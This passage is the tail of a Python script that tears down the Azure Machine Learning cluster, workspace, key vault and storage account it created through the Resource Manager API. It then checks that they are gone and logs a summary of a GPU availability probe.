        del_and_wait(base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                     "/computes/" + cname + "?api-version=" + VER["compute"],
                     "cluster-" + cname, 420)
    if own.get("ws"):
        del_and_wait(base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                     "?api-version=" + VER["aml"], "ws", 600)
    if own.get("kv"):
        del_and_wait(base + "/Microsoft.KeyVault/vaults/" + own["kv"] +
                     "?api-version=" + VER["kv"], "kv", 300)
    if own.get("sa"):
        del_and_wait(base + "/Microsoft.Storage/storageAccounts/" + own["sa"] +
                     "?api-version=" + VER["stg"], "sa", 300)
    st, lb = arm(tok, base + "/Microsoft.MachineLearningServices/workspaces"
                 "?api-version=" + VER["aml"], timeout=90)
    names = [x.get("name") for x in ((lb.get("value") or [])
                                     if isinstance(lb, dict) else [])]
    emit({"step": "ws-absence-list", "http": st, "names": names[:20],
          "mine_present": WS in (names or [])})
    summary["teardown"]["ws_list"] = {"http": st, "mine_present": WS in (names or [])}
    st, rl = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "/resources?api-version=2021-04-01")
    mine = [{"name": x.get("name"), "type": x.get("type")}
            for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])
            if str(x.get("name", "")).lower().startswith("c211i126069") or
            str(x.get("name", "")).lower().startswith("c211-i126069")]
    emit({"step": "rg-inventory-final", "http": st, "mine": mine})
    summary["teardown"]["rg_inventory"] = {"http": st, "mine": mine}
    emit({"step": "DONE", "device": device["found"], "uuid": device["uuid"],
          "sku": device.get("sku"), "cluster": device.get("cluster"),
          "v100_region": pick_v, "nv_region": pick_n})
    emit_summary(summary)
    emit({"step": "PROBE-EXIT", "code": 0})


if __name__ == "__main__":
    main()
